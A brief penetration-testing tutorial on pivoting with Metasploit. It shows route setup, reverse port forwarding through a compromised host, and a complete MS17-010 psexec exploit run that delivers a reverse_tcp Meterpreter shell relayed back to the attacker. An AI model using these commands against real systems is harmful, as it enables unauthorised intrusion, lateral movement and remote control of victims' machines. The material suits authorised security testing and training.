# Penetration Testing Checklist

A complete guide to Port Forwarding to the target host, through Metasploit.

This guide is written in a methodical step-by-step process, it is recommended not skipping steps.&nbsp;
&nbsp;

&nbsp;
**Configure route(s)**
```Windows
msf> route add {target-host} 255.255.255.255 {session-id}
```
&nbsp;

**Configure reverse portforwarding from the initial compromised host**
```Windows
meterpreter> portfwd add -R -l {kali-listen-port} -p {compromised-listen-port} -L {target-host}
```
```Windows
-R: Indicates a reverse portfwd
-l: The local listening port on the attackers machine
-p: The local listening port on the initial compromised machine
-L: The final target in the chain
```
**For example:**
```Windows
meterpreter> portfwd add -R -l 8081 -p 3000 -L 10.10.10.1
```
```Windows
msf> use exploit/windows/smb/ms17_010_psexec
msf> set payload windows/x64/meterpreter/reverse_tcp
msf> set lhost {compromised-host-address} ##Compromised Host IP/Interface
msf> set lport 3000 ##Compromised Host Listen Port
msf> set rhosts 10.10.10.1 ##Final Target IP
msf> set disablepayloadhandler true
msf> run -j
```
